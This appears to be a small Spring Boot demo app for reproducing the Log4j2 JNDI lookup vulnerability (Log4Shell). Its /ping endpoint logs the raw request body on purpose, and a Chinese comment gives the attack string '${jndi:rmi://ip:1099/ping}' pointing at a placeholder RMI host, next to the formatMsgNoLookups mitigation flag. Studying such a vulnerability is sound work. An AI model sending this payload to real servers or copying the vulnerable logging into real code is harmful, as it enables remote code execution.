package com.test.log4j2;


import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
@RestController
public class Log4j2Application {
    private final static Logger logger = LoggerFactory.getLogger(Log4j2Application.class);

    public static void main(String[] args) {
        //-Dlog4j2.formatMsgNoLookups=true  禁止日志lookup 可以使服务器rmi失效
        SpringApplication.run(Log4j2Application.class, args);
    }

    @GetMapping("/ping")
    public void ping(@RequestBody String key) {

        // 攻击key为  ${jndi:rmi://ip:1099/ping}
        logger.error("user {}", key);
    }
}
